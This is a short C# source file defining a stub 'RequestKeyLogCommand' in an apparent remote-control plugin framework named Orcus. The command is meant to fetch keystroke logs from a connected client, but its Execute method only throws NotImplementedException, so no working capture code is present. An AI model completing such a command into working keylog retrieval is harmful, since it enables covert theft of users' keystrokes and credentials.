using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Client
{
    public class RequestKeyLogCommand : StaticCommand
    {
        public override Guid CommandId { get; } = new Guid(0xd33f27ca, 0x9290, 0x644e, 0x92, 0x7a, 0x81, 0x33, 0x24,
            0x74, 0xd1, 0x17);

        public override string Name { get; } = Resources.StaticCommands.Client_RequestKeyLogCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_RequestKeyLogCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }
    }
}